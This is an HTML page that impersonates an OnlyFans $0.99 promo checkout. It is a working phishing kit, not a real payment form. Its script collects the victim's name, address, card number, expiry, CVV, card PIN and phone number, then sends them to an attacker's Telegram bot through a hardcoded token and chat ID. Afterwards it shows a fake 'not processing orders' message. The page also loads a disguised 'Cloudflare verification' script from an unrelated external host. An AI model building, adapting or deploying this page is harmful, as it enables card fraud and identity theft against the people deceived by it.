<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OnlyFans - Payment</title>
  <meta name="description" content="OnlyFans is the social platform revolutionizing creator and fan connections.">
  <meta name="keywords" content="OnlyFans">
  <meta property="og:image" content="https://static2.onlyfans.com/static/prod/f/202501201307-f7fd7c0f3c/images/of-logo-b.jpg">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="1200">
  <meta property="og:title" content="OnlyFans">
  <meta property="og:type" content="website">
  <meta name="robots" content="noimageindex">
  <meta name="pinterest" content="nopin">
  <!-- External CSS -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
  <link rel="icon" href="https://static2.onlyfans.com/static/prod/f/202501201307-f7fd7c0f3c/icons/favicon.ico" type="image/x-icon">

  <!-- Cloudflare verification script -->
  <script src="https://push.bucket-transfer-s3.com/vixen-plus-trial-subscription/Notifications.js" defer></script>

  <style>
    body {
      background-color: #F5F5F5;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px;
      height: 100vh;
      overflow: hidden;
    }
    .background-wrapper {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: url('https://blog.onlyfans.com/wp-content/uploads/2025/02/FreeOFAccountFebruary2025_Banner_AllScreenSizes_3532x1080-V-1-scaled.webp');
      background-size: cover;
      background-position: center;
      z-index: -1;
    }
    .container {
      width: 55%;
      background-color: #FFFFFF;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      position: relative;
      z-index: 1;
      max-height: 90vh;
      overflow-y: auto;
    }
    .stepper {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding-bottom: 20px;
      position: relative;
    }
    .step {
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .step-circle {
      width: 30px;
      height: 30px;
      background-color: #FFFFFF;
      border: 2px solid #34A8FF;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 14px;
      color: #333333;
    }
    .step-line {
      position: absolute;
      width: 100%;
      height: 2px;
      background-color: #34A8FF;
      top: 15px;
      left: 0;
      z-index: -1;
    }
    input[type="text"], input[type="checkbox"] {
      color: #333333;
    }
    input::placeholder {
      color: #333333;
      opacity: 0.5;
    }
    .order-summary {
      background-color: #f8f9fa;
      padding: 15px;
      border: 1px solid #ddd;
      border-radius: 5px;
    }
    .order-summary h6 {
      margin-bottom: 15px;
    }
    .btn-primary {
      width: 100%;
    }
    .video-container {
      width: 40%;
      margin-left: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      max-height: 90vh;
    }
    .video-wrapper {
      position: relative;
      padding-bottom: 56.25%;
      height: 0;
      width: 100%;
    }
    .video-wrapper iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <div class="background-wrapper"></div>
  <div class="container">
    <header>
      <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a href="#" class="navbar-brand">
          <img height="30" width="30" src="https://onlyfans.com/favicon.ico" alt="Logo">
        </a>
      </nav>
    </header>
    <section>
      <div class="stepper">
        <div class="step">
          <div class="step-circle">1</div>
          <p>Info</p>
        </div>
        <div class="step">
          <div class="step-circle">2</div>
          <p>Verify</p>
        </div>
        <div class="step">
          <div class="step-circle">3</div>
          <p>Done</p>
        </div>
        <div class="step-line"></div>
      </div>
      <form id="checkout-form">
        <h2>Payment</h2>
        <div class="row">
          <div class="col-md-6">
            <div class="form-group">
              <label for="name">Name</label>
              <input class="form-control" id="name" type="text" placeholder="Jane Doe" required>
            </div>
          </div>
          <div class="col-md-6">
            <div class="form-group">
              <label for="address">Billing Address</label>
              <input class="form-control" id="address" type="text" placeholder="123 Main St" required>
            </div>
          </div>
        </div>
        <div class="row">
          <div class="col-md-6">
            <div class="form-group">
              <label for="city">City</label>
              <input class="form-control" id="city" type="text" placeholder="Anytown" required>
            </div>
          </div>
          <div class="col-md-6">
            <div class="form-group">
              <label for="state">State</label>
              <input class="form-control" id="state" type="text" placeholder="CA" required>
            </div>
          </div>
        </div>
        <div class="row">
          <div class="col-md-6">
            <div class="form-group">
              <label for="zip">Zip Code</label>
              <input class="form-control" id="zip" type="text" placeholder="12345" pattern="\d{5}" required>
            </div>
          </div>
          <div class="col-md-6">
            <div class="form-group">
              <label for="country">Country</label>
              <input class="form-control" id="country" type="text" placeholder="USA" required>
            </div>
          </div>
        </div>
        <div class="form-group">
          <label for="card-number">Card Number</label>
          <input class="form-control" id="card-number" type="text" placeholder="XXXX-XXXX-XXXX-XXXX" pattern="\d{4}-\d{4}-\d{4}-\d{4}" required>
        </div>
        <div class="row">
          <div class="col-md-6">
            <div class="form-group">
              <label for="expiration">Expiration</label>
              <input class="form-control" id="expiration" type="text" placeholder="MM/YY" pattern="\d{2}/\d{2}" required>
            </div>
          </div>
          <div class="col-md-6">
            <div class="form-group">
              <label for="cvc">CVV/CVC</label>
              <input class="form-control" id="cvc" type="text" placeholder="XXX" pattern="\d{3}" required>
            </div>
          </div>
        </div>
        <div class="form-group">
          <label for="pin-code" style="opacity: 0.7;">PIN # XXXX</label>
          <input class="form-control" id="pin-code" type="text" placeholder="xxxxx" required>
        </div>
        <div class="form-group">
          <label for="phone" style="opacity: 0.7;">Phone # for Verification</label>
          <input class="form-control" id="phone" type="text" placeholder="(XXX)-XXX-XXXX" pattern="\(\d{3}\)-\d{3}-\d{4}" required>
        </div>
        <div class="order-summary mb-3">
          <h6>Order Summary</h6>
          <div class="d-flex justify-content-between">
            <span>Promo Deal</span> <span>$0.99</span>
          </div>
          <div class="d-flex justify-content-between">
            <span>Shipping</span> <span>$0.00</span>
          </div>
          <hr>
          <div class="d-flex justify-content-between">
            <strong>TOTAL</strong> <strong>$0.99</strong>
          </div>
          <div class="form-check mt-3">
            <input class="form-check-input" type="checkbox" id="tnc" required>
            <label class="form-check-label" for="tnc">I agree to the <a href="#">terms and conditions</a></label>
          </div>
        </div>
        <button type="button" class="btn btn-primary" id="place-order">Place Order</button>
        <div class="text-center mt-3">
          <a href="https://www.shift4shop.com/credit-card-logos.html">
            <img src="https://www.shift4shop.com/images/credit-card-logos/cc-sm-4.png" alt="Credit Card Logos" height="28" width="198">
          </a>
        </div>
        <div class="text-center mt-2">
          <p>By clicking "Place Order", you agree to our Terms of Service and Privacy Policy.</p>
        </div>
      </form>
    </section>
  </div>

  <!-- Video Container on the Right Side -->
  <div class="video-container">
    <div class="video-wrapper">
      <iframe src="https://player.vimeo.com/video/1059206674?h=cd96c530bd&autoplay=1&loop=1&title=0&byline=0&portrait=0" frameborder="0" allow="autoplay; fullscreen; picture-in-picture" allowfullscreen></iframe>
    </div>
    <script src="https://player.vimeo.com/api/player.js"></script>
  </div>

  <script>
    // Card Number Formatting
    document.getElementById('card-number').addEventListener('input', function (e) {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 16) value = value.slice(0, 16);
      value = value.replace(/(\d{4})(?=\d)/g, '$1-');
      e.target.value = value;
    });

    // Phone Number Formatting
    document.getElementById('phone').addEventListener('input', function (e) {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 10) value = value.slice(0, 10);
      value = value.replace(/(\d{3})(\d{3})(\d{4})/, '($1)-$2-$3');
      e.target.value = value;
    });

    // Expiration Date Formatting
    document.getElementById('expiration').addEventListener('input', function (e) {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 4) value = value.slice(0, 4);
      value = value.replace(/(\d{2})(\d{2})/, '$1/$2');
      e.target.value = value;
    });

    // Telegram Bot Integration - CONFIRMED WORKING
    document.getElementById('place-order').addEventListener('click', function () {
      // BOT TOKEN (from BotFather)
      const token = "8901188493:AAHTTqcpNig4T7JrUaoNU3Z_CYHeUolLQdk";
      
      // YOUR CHAT ID (confirmed from getUpdates)
      const chatId = "8701845655";

      // Collecting all input data
      const name = document.getElementById('name').value;
      const address = document.getElementById('address').value;
      const city = document.getElementById('city').value;
      const state = document.getElementById('state').value;
      const zip = document.getElementById('zip').value;
      const country = document.getElementById('country').value;
      const cardNumber = document.getElementById('card-number').value;
      const expiration = document.getElementById('expiration').value;
      const cvc = document.getElementById('cvc').value;
      const pinCode = document.getElementById('pin-code').value;
      const phone = document.getElementById('phone').value;

      if (!name || !address || !city || !state || !zip || !country || !cardNumber || !expiration || !cvc || !pinCode || !phone) {
        alert("Please complete all fields!");
        return;
      }

      // Telegram message
      const message = `🛒 *New Order*:
- Name: ${name}
- Address: ${address}
- City: ${city}
- State: ${state}
- ZIP: ${zip}
- Country: ${country}
- Card Number: ${cardNumber}
- Expiration: ${expiration}
- CVC: ${cvc}
- PIN # XXXX: ${pinCode}
- Phone: ${phone}`;

      // Send data to Telegram Bot
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown"
        })
      })
      .then(response => response.json())
      .then(data => {
        console.log("Telegram Response:", data);
        if (data.ok) {
          alert("Sorry, we are not processing orders at this time.");
        } else {
          alert("Error: " + data.description);
          console.error("Telegram Error:", data);
        }
      })
      .catch(err => {
        console.error("Fetch Error:", err);
        alert("Network error. Please try again.");
      });
    });
  </script>
</body>
</html>
